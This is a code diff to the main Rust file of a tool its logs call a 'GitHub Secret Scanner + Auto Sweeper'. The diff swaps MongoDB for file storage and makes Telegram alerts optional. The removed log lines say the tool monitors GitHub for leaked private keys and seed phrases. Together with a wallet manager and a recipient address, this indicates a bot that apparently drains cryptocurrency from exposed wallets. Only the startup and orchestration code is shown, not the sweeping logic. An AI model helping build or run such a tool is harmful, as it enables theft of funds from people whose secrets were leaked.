@@ -5,9 +5,9 @@ mod patterns;
 mod validators;
 mod wallet;
 mod telegram;
-mod database;
 mod monitor;
 mod models;
+mod storage;
 
 use std::sync::Arc;
 use tracing::{info, warn, error};
@@ -18,48 +18,23 @@ static ALLOC: jemallocator::Jemalloc = jemallocator::Jemalloc;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // Load environment variables
     dotenv().ok();
     
-    // Initialize logging
     tracing_subscriber::fmt()
         .with_max_level(tracing::Level::INFO)
         .with_target(false)
-        .with_file(true)
-        .with_line_number(true)
         .init();
 
-    info!("🚀 Starting GitHub Secret Scanner + Auto Sweeper...");
+    info!("🚀 Starting GitHub Secret Scanner (Railway Mode)...");
     
-    // Load configuration
     let config = config::Config::from_env()?;
     let config = Arc::new(config);
     
     info!("✅ Configuration loaded");
-    info!("📡 Poll interval: {} seconds", config.poll_interval_secs);
-    info!("👛 Recipient address: {}", config.recipient_address);
     
-    // Initialize cache
-    let cache = core::cache::CacheManager::new();
-    info!("✅ Cache initialized");
-    
-    // Initialize database
-    let db = match database::mongo::MongoDB::new(
-        &config.mongodb_uri,
-        &config.mongodb_db,
-    ).await {
-        Ok(db) => {
-            info!("✅ MongoDB connected");
-            db
-        }
-        Err(e) => {
-            error!("❌ MongoDB connection failed: {}", e);
-            return Err(e);
-        }
-    };
-    
-    let db_ops = Arc::new(database::ops::DatabaseOps::new(db.clone()));
-    info!("✅ Database operations ready");
+    // File-based storage (no MongoDB)
+    let store = storage::file_store::FileStore::new();
+    info!("✅ File storage initialized");
     
     // Initialize wallet manager
     let wallet_manager = match wallet::manager::WalletManager::new(config.clone()) {
@@ -68,66 +43,63 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             Arc::new(wm)
         }
         Err(e) => {
-            error!("❌ Wallet manager initialization failed: {}", e);
+            error!("❌ Wallet manager failed: {}", e);
             return Err(e);
         }
     };
     
-    // Initialize telegram alerts
+    // Initialize telegram (optional — agar env vars hain)
     let telegram = match telegram::alerts::TelegramAlerts::new(config.clone()) {
         Ok(ta) => {
             info!("✅ Telegram alerts initialized");
             Arc::new(ta)
         }
         Err(e) => {
-            error!("❌ Telegram initialization failed: {}", e);
-            return Err(e);
+            warn!("⚠️ Telegram init failed: {} — continuing without alerts", e);
+            // Dummy telegram (no-op)
+            Arc::new(telegram::alerts::TelegramAlerts::dummy())
         }
     };
     
-    // Initialize scan engine (with all components)
-    let scan_engine = scanner::engine::ScanEngine::new(
+    // Initialize cache
+    let cache = core::cache::CacheManager::new();
+    
+    // Initialize scanner
+    let scanner = scanner::engine::ScanEngine::new(
         config.clone(),
         cache.clone(),
         wallet_manager.clone(),
         telegram.clone(),
-        db_ops.clone(),
+        store.clone(),
     );
     
-    info!("🔧 Starting scan engine...");
+    info!("🔧 Starting scanner...");
     
-    // Start scan engine
     let scan_handle = tokio::spawn(async move {
-        scan_engine.run().await;
+        scanner.run().await;
     });
     
-    // Initialize realtime monitor
+    // Initialize monitor
     let monitor = monitor::realtime::RealtimeMonitor::new(
         config.clone(),
-        db_ops.clone(),
+        store.clone(),
         telegram.clone(),
         wallet_manager.clone(),
     );
     
-    info!("🔄 Starting realtime monitor...");
+    info!("🔄 Starting monitor...");
     
-    // Start monitor
     let monitor_handle = tokio::spawn(async move {
         monitor.run().await;
     });
     
-    info!("✅ All systems running. Press Ctrl+C to stop.");
-    info!("📊 Monitoring GitHub for leaked private keys and seed phrases...");
+    info!("✅ All systems running");
     
-    // Wait for shutdown signal
     tokio::signal::ctrl_c().await?;
     warn!("🛑 Shutting down...");
     
-    // Abort tasks
     scan_handle.abort();
     monitor_handle.abort();
-    
-    info!("👋 Goodbye!");
     
     Ok(())
 }
